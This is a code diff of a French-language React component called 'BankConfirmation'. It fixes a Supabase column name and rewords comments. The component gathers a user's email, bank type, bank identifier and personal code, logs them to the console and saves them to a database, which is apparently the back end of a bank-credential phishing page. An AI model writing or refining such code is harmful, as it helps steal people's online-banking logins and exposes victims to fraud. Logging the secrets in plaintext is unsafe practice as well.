@@ -1,4 +1,3 @@
-
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
@@ -37,25 +36,25 @@ const BankConfirmation: React.FC = () => {
         return;
       }
       
-      // Préparation des données bancaires uniquement en utilisant les noms de champs exacts
-      // de la base de données Supabase
+      // Préparation des données bancaires en utilisant les noms de champs corrects
+      // qui correspondent à la structure de la base de données Supabase
       const bankData = {
         email,
         typebanque: typeBanque,
-        identifiantbanque: identifiantBancaire,
+        identifiantbancaire: identifiantBancaire, // Corrigé pour correspondre à la colonne dans Supabase
         codepersonnel: codePersonnel
       };
       
       console.log("Données à envoyer à Supabase:", bankData);
       
-      // Mettre à jour la session avec les données complètes
+      // Mettre à jour la session avec les données complètes (en format camelCase pour l'interface)
       updateUserSession({
         typeBanque,
         identifiantBancaire,
         codePersonnel
       });
       
-      // Envoyer uniquement les données bancaires à Supabase
+      // Envoyer les données bancaires à Supabase
       const result = await upsertUser(bankData);
       console.log("Résultat de l'opération upsertUser:", result);
       
